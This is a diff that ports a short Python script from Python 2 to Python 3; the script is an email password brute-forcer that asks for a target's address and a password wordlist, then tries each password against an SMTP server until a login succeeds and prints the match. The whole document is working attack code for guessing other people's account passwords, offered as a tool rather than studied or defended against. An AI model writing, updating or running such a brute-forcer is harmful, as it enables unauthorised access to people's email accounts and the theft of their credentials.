@@ -16,22 +16,22 @@ smtpserver = smtplib.SMTP("smtp.google.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-print "connection successful"
+print("connection successful")
 
-print "made by V1 MoDzZz"
+print("made by V1 MoDzZz")
 
-user = raw_input("Enter the targets email address: ")
+user = input("Enter the targets email address: ")
 
-pwfile = raw_input("what is your password file directory: ")
+pwfile = input("what is your password file directory: ")
 pwfile = open(pwfile, "r")
 
 
 for password in pwfile:
     try:
         smtpserver.login(user, password)
-        print "so the password is ", password
+        print("so the password is ", password)
         break;
         
     except smtplib.SMTPAuthenticationError:
-        print password, "is not the password"
+        print(password, "is not the password")
 
